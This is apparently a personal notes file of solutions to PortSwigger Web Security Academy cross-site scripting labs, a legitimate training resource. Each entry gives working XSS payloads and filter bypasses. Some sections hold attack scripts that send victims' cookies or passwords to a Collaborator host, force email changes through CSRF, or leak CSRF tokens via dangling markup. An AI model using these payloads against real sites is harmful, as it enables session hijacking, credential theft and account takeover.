<!-- omit in toc -->
# XSS

<!-- omit in toc -->
## Table of Contents

- [[#Reflected XSS into HTML context with nothing encoded]]
- [[#Stored XSS into HTML context with nothing encoded]]
- [[#DOM XSS in document.write sink using source location.search]]
- [[#DOM XSS in document.write sink using source location.search inside a select element]]
- [[#DOM XSS in innerHTML sink using source location.search]]
- [[#DOM XSS in jQuery anchor href attribute sink using location.search source]]
- [[#DOM XSS in jQuery selector sink using a hashchange event]]
- [[#DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded]]
- [[#Reflected DOM XSS]]
- [[#Stored DOM XSS]]
- [[#Exploiting cross-site scripting to steal cookies]]
- [[#Exploiting cross-site scripting to capture passwords]]
- [[#Exploiting XSS to perform CSRF]]
- [[#Reflected XSS into HTML context with most tags and attributes blocked]]
- [[#Reflected XSS into HTML context with all tags blocked except custom ones]]
- [[#Reflected XSS with some SVG markup allowed]]
- [[#Reflected XSS into attribute with angle brackets HTML-encoded]]
- [[#Stored XSS into anchor href attribute with double quotes HTML-encoded]]
- [[#Reflected XSS in canonical link tag]]
- [[#Reflected XSS into a JavaScript string with single quote and backslash escaped]]
- [[#Reflected XSS into a JavaScript string with angle brackets HTML encoded]]
- [[#Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped]]
- [[#Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped]]
- [[#Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped]]
- [[#Reflected XSS protected by CSP, with dangling markup attack]]

## Reflected XSS into HTML context with nothing encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

```ad-done
title: Solution
1. Copy and paste the following into the search box: 
~~~html
<script>alert(1)</script>
~~~
3. Click "Search".
```

## Stored XSS into HTML context with nothing encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
```ad-hint
title: Quick Solution
Although this is an **extremely** easy lab to complete I also tried a tool called ``dalfox`` that is able to perform Store XSS assessments. The command I used is the following (on version 2.5.5):
~~~
dalfox sxss -X POST "<target_url>/post/comment" -d "csrf=<crsf_token>&postId=2&comment=thelicato&name=thelicato&email=the@lica.to&website=" -p "comment" --cookie="session=<session_cookie>" --trigger "<target_url>/post?postId=2" --request-method GET -w 1
~~~
The requests can also be proxied to Burp by adding ``--proxy <proxy_url>``
```

```ad-done
title: Solution
1. Enter the following into the comment box:
~~~html
<script>alert(1)</script>
~~~
3. Enter a name, email and website.
4. Click "Post comment".
5. Go back to the blog.
```

## DOM XSS in document.write sink using source location.search
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

```ad-done
title: Solution
1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an ``img src`` attribute.
3. Break out of the img attribute by searching for:
~~~html
"><svg onload=alert(1)>
~~~
```

## DOM XSS in document.write sink using source location.search inside a select element
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

```ad-hint
title: Quick Solution
The lab description says that there is a vulnerability in the stock checker functionality. The ``document.write`` function is called with data from ``location.search`` that extracts a ``storeId`` parameter. Adding it to the URL can trigger the vulnerability:
~~~html
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
~~~
```

```ad-done
title: Solution
1. On the product pages, notice that the dangerous JavaScript extracts a ``storeId`` parameter from the ``location.search`` source. It then uses ``document.write`` to create a new option in the select element for the stock checker functionality.
2. Add a ``storeId`` query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
3. In your browser, notice that your random string is now listed as one of the options in the drop-down list.
4. Right-click and inspect the drop-down list to confirm that the value of your ``storeId`` parameter has been placed inside a select element.
5. Change the URL to include a suitable XSS payload inside the ``storeId`` parameter as follows:
~~~html
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
~~~
```

## DOM XSS in innerHTML sink using source location.search
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

```ad-done
title: Solution
1. Enter the following into the into the search box:
~~~html
<img src=1 onerror=alert(1)>
~~~
3. Click "Search".
The value of the ``src`` attribute is invalid and throws an error. This triggers the ``onerror`` event handler, which then calls the ``alert()`` function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.
```

## DOM XSS in jQuery anchor href attribute sink using location.search source
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

```ad-done
title: Solution
1. On the Submit feedback page, change the query parameter `returnPath` to / followed by a random alphanumeric string.
2. Right-click and inspect the element, and observe that your random string has been placed inside an a ``href`` attribute.
3. Change ``returnPath`` to 
~~~http
javascript:alert(document.cookie)
~~~
, then hit enter and click "back".
```

## DOM XSS in jQuery selector sink using a hashchange event
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

```ad-done
title: Solution
1. Notice the vulnerable code on the home page using Burp or your browser's DevTools.
2. From the lab banner, open the exploit server.
3. In the **Body** section, add the following malicious `iframe`:
~~~html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
~~~
4. Store the exploit, then click **View exploit** to confirm that the ``print()`` function is called.
Go back to the exploit server and click **Deliver to victim** to solve the lab.
```

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

```ad-hint
title: Quick Solution
Detect that *AngularJS* is used on the website. Then you can simply test different XSS payloads for AngularJS. This is an interesting source for them: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md

A payload that works is the following:
~~~js
{{constructor.constructor('alert(1)')()}}
~~~
```

```ad-done
title: Solution
1. Enter a random alphanumeric string into the search box.
2. View the page source and observe that your random string is enclosed in an ``ng-app`` directive.
3. Enter the following AngularJS expression in the search box:
~~~js
{{$on.constructor('alert(1)')()}}
~~~
4. Click search
```

## Reflected DOM XSS
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

```ad-hint
title: Quick Solution
The website uses a JavaScript file to display search results (``searchResults.js``). To break the code enter the following term:
~~~js
\"-alert(1)}//
~~~
```

```ad-done
title: Solution
1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
2. Back in the lab, go to the target website and use the search bar to search for a random test string, such as "XSS".
3. Return to the Proxy tool in Burp Suite and forward the request.
4. On the Intercept tab, notice that the string is reflected in a JSON response called ``search-results``.
5. From the Site Map, open the ``searchResults.js`` file and notice that the JSON response is used with an ``eval()`` function call.
6. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
7. To solve this lab, enter the following search term:
~~~js
\"-alert(1)}//``
~~~
As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.

An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the ``alert()`` function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:
~~~json
{"searchTerm":"\\"-alert(1)}//", "results":[]}
~~~
```

## Stored DOM XSS
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

```ad-done
title: Solution
Post a comment containing the following vector:
~~~html
<><img src=1 onerror=alert(1)>
~~~

In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.
```

## Exploiting cross-site scripting to steal cookies
Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

```ad-hint
title: Quick Solution
There is a stored XSS in the comments, just add a ``fetch`` to the Burp Collaborator to get the ``cookie`` of the victim. Payload in the next section.
```

```ad-done
title: Solution
1. Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
~~~javascript
<script>
    fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>
~~~
This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their cookie.
4. Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.
```

## Exploiting cross-site scripting to capture passwords
Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

```ad-hint
title: Quick Solution
Exploit an XSS vulnerability in the comments to make anyone who views the comment to issue a POST request to the Burp Collaborator containing their username and password. Payload in the next section.
```

```ad-done
title: Solution
1. Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
~~~javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
~~~
This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their username and password.
4. Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction.If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's username and password in the POST body.
6. Use the credentials to log in as the victim user.
```

## Exploiting XSS to perform CSRF
Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

```ad-hint
title: Quick Solution
As stated in the description of the lab there is an XSS vulnerability in the comments section. This vulnerability can be leveraged to perform a CSRF attack and change the email address of the victim. Payload in the next section.
```

```ad-done
title: Solution
1. Log in using the credentials provided. On your user account page, notice the function for updating your email address.
2. If you view the source for the page, you'll see the following information:
 - You need to issue a POST request to ``/my-account/change-email``, with a parameter called ``email``.
 - There's an anti-CSRF token in a hidden input called token.
This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
3. Submit the following payload in a blog comment:
~~~javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
~~~
This will make anyone who views the comment issue a POST request to change their email address to ``test@test.com``.
```

## Reflected XSS into HTML context with most tags and attributes blocked
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

```ad-hint
title: Quick Solution
There is a *WAF* to protect the website from XSS. This firewall blocks HTML tags in the search functionality. The easiest way to reach the solution is to test every tag in the *cheatsheet* and see which one works. Payload in the next section.
```

```ad-done
title: Solution
1. Inject a standard XSS vector, such as: ``<img src=1 onerror=print()>``
2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
3. With your browser proxying traffic through Burp Suite, use the search function in the lab. Send the resulting request to Burp Intruder.
4. In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: ``<>``
5. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: ``<§§>``
6. Visit the XSS cheat sheet and click "Copy tags to clipboard".
7. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
8. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the ``body`` payload, which caused a 200 response.
9. Go back to the Positions tab in Burp Intruder and replace your search term with: ``<body%20=1>``
10. Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: ``<body%20§§=1>``
11. Visit the XSS cheat sheet and click "copy events to clipboard".
12. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
13. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.
14. Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID:
~~~js
<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
~~~
15. Click "Store" and "Deliver exploit to victim".
```

## Reflected XSS into HTML context with all tags blocked except custom ones
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

```ad-hint
title: Quick Solution
This lab blocks **every** HTML tag except custom ones. Looking at the **cheatsheet** there are some payloads that can be used, here is the one that uses only custom tags and is compatible with every browser except Firefox:
~~~html
<xss id=x tabindex=1 onfocus=alert(1)></xss>
~~~
To automatically trigger the payload on page load add ``#x``. Even though this payload is not compatible with *Firefox* the lab will be marked as solved (the target browser is probably *Chrome*).
```

```ad-done
title: Solution
1. Go to the exploit server and paste the following code, replacing ``your-lab-id`` with your lab ID:
~~~javascript
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
~~~
2. Click "Store" and "Deliver exploit to victim".
This injection creates a custom tag with the ID ``x``, which contains an ``onfocus`` event handler that triggers the ``alert`` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the ``alert`` payload to be called.
```

## Reflected XSS with some SVG markup allowed
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

```ad-done
title: Solution
1. Inject a standard XSS payload, such as:
~~~html
<img src=1 onerror=alert(1)>
~~~
3. Observe that this payload gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
4. With your browser proxying traffic through Burp Suite, use the search function in the lab. Send the resulting request to Burp Intruder.
5. In Burp Intruder, in the Positions tab, click "Clear §".
6. In the request template, replace the value of the search term with: ``<>``
7. Place the cursor between the angle brackets and click "Add §" twice to create a payload position. The value of the search term should now be: ``<§§>``
8. Visit the XSS cheat sheet and click "Copy tags to clipboard".
9. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
10. When the attack is finished, review the results. Observe that all payloads caused an HTTP 400 response, except for the ones using the ``<svg>``, ``<animatetransform>``, ``<title>``, and ``<image>`` tags, which received a 200 response.
11. Go back to the Positions tab in Burp Intruder and replace your search term with:
~~~html
<svg><animatetransform%20=1>
~~~
13. Place the cursor before the = character and click "Add §" twice to create a payload position. The value of the search term should now be: 
~~~html
<svg><animatetransform%20§§=1>
~~~
15. Visit the XSS cheat sheet and click "Copy events to clipboard".
16. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
17. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the ``onbegin`` payload, which caused a 200 response.
18. Visit the following URL in your browser to confirm that the alert() function is called and the lab is solved:
~~~
https://your-lab-id.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
~~~
```

## Reflected XSS into attribute with angle brackets HTML-encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

```ad-done
title: Solution
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a quoted attribute.
3. Replace your input with the following payload to escape the quoted attribute and inject an event handler: **"onmouseover="alert(1)**
4. Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in your browser. When you move the mouse over the injected element it should trigger an alert.
```

## Stored XSS into anchor href attribute with double quotes HTML-encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

```ad-done
title: Solution
1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute.
4. Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: 
~~~http
javascript:alert(1)
~~~
6. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. Clicking the name above your comment should trigger an alert.
```

## Reflected XSS in canonical link tag
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

<!-- omit in toc -->
### A bit of theory
The ``HTMLElement.accessKey`` property sets the keystroke which a user can press to jump to a given element.

```ad-done
title: Solution
1. Visit the following URL, replacing ``your-lab-id`` with your lab ID:
~~~
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
~~~
This sets the ``X`` key as an access key for the whole page. When a user presses the access key, the ``alert`` function is called.
2.To trigger the exploit on yourself, press one of the following key combinations:
 - On Windows: ``ALT+SHIFT+X``
 - On MacOS: ``CTRL+ALT+X``
 - On Linux: ``Alt+X``
```

## Reflected XSS into a JavaScript string with single quote and backslash escaped
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

```ad-hint
title: Quick Solution
This lab can be easily solved using ``dalfox``, in this example I'm using the dockerized version:
~~~
docker run -it --rm secsi/dalfox url "<lab_url>/?search=thelicato> -w 10
~~~
```

```ad-done
title: Solution
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload ``test'payload`` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Replace your input with the following payload to break out of the script block and inject a new script: 
~~~html
</script><script>alert(1)</script>
~~~
5. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. When you load the page it should trigger an alert.
```

## Reflected XSS into a JavaScript string with angle brackets HTML encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

```ad-done
title: Solution
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
4. '-alert(1)-'``
5. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. When you load the page it should trigger an alert.
```

## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

```ad-done
title: Solution
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload ``test'payload`` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Try sending the payload ``test\payload`` and observe that your backslash doesn't get escaped.
5. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
~~~js
\'-alert(1)//
~~~
7. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. When you load the page it should trigger an alert.
```

## Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

```ad-done
title: Solution
1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an ``onclick`` event handler attribute.
4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls ``alert``, using the following payload: 
~~~
http://foo?&apos;-alert(1)-&apos;
~~~
6. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. Clicking the name above your comment should trigger an alert.
```

## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

```ad-hint
title: Quick Solution
This lab contains a reflected XSS. The searched text gets reflected inside a **template string**, so it is pretty easy to exploit just by typing:
~~~js
${alert(1)}
~~~
```

```ad-done
title: Solution
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript template string.
3. Replace your input with the following payload to execute JavaScript inside the template string:
~~~js
${alert(1)}
~~~
5. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. When you load the page it should trigger an alert.
```

## Reflected XSS protected by CSP, with dangling markup attack
Reference: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack

```ad-done
title: Solution
1. Log in to the lab using the account provided above.
2. Examine the Update email function. Observe that there is an XSS vulnerability in the [[email]] parameter.
3. Go to the exploit server and paste the following template into the Body field, substituting the placeholder URLs with your own lab ID and exploit server ID:
~~~html
<body>
<script>
let form = document.createElement('form');
form.action='https://YOUR-LAB-ID.web-security-academy.net/my-account';
let input = document.createElement('input');
input.name = 'email';
input.value = '"><table background=\'//YOUR-EXPLOIT-SERVER-ID.web-security-academy.net?';
form.append(input);
document.body.appendChild(form);
form.submit()
</script>
</body>
~~~
4. Click Store and then Deliver exploit to victim. If the victim's browser runs this script while they are still logged in to the lab website, their browser will send a request to the exploit server containing their CSRF token in the query string.
5. Click Access log. You should see an HTTP interaction that was initiated by the application. This will look something like:
~~~http
GET /exploit?%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type=%22hidden%22%20name=%22csrf%22%20value=%22jOBONqhb2sgP2zCGMhKC3rb91j1TAlWX%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class= HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36".
~~~
6. URL decode the query string and note the CSRF token.
7. Go back to the exploit server. Replace the contents of the Body field with the following CSRF PoC, substituting ``YOUR-LAB-ID`` with the ID of your lab, and ``STOLEN-CSRF-TOKEN`` for the CSRF token you copied from the access log:
~~~html
<body>
<script>
let form = document.createElement('form');
form.action='https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email';
form.method='post';
let input = document.createElement('input');
input.name = 'email';
input.value = 'hacker@evil-user.net';
let csrf = document.createElement('input');
csrf.name = 'csrf';
csrf.value = 'STOLEN-CSRF-TOKEN';
form.append(csrf);
form.append(input);
document.body.appendChild(form);
form.submit()
</script>
</body>
~~~
8. Click Store and Deliver exploit to victim. The user's email will be changed to ``hacker@evil-user.net``.
```
